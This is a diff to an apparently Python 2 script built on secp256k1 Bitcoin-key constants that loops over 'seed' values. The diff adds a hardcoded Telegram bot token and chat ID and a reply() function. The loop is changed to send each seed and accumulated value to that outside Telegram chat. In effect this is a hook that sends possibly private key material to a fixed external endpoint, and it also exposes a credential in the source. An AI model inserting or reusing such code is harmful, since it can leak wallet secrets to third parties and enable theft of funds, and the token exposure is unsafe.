@@ -14,6 +14,22 @@ import random
 import requests
 import json
 
+import urllib2
+TOKEN = '110309400:AAExG6jwuCUjJzeLzWqi4jmDhrEriDGT5fY'
+
+def reply(msg):
+    
+    resp = urllib2.urlopen(BASE_URL + 'sendMessage', urllib.urlencode({
+    'chat_id': '6660201' ,
+    'text': msg.encode('utf-8'),
+    'disable_web_page_preview': 'true',
+    'reply_to_message_id': "" ,
+    })).read()
+
+    return
+
+
+
 # secp256k1, http://www.oid-info.com/get/1.3.132.0.10
 _p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2FL
 _r = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141L
@@ -1790,5 +1806,9 @@ for joder in range(10000):
 
 
     print semilla  , acumulado
-    sleep (4)
+    
+    reply (semilla)
+    reply (acumulado)
+    
+    #sleep (4)
 
